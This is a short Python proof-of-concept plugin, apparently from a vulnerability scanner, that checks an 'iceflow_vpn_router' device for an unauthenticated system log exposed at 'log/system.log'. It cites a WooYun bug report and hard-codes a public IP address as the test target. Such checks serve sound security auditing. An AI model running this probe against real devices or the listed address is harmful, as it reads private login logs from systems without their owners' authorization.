#!/usr/bin/env python
#-*- coding:utf-8 -*-
#from:http://www.wooyun.org/bugs/wooyun-2010-0134377
import urlparse
def assign(service, arg):
    if service == 'iceflow_vpn_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg + 'log/system.log'
    code, head, res, errcode, _ = curl.curl(poc)
    if code == 200 and 'login successfully' in res:
        security_hole(poc)

if __name__ == '__main__':
    from dummy import *
    audit(assign('iceflow_vpn_router', 'http://221.202.29.20:8080/')[1])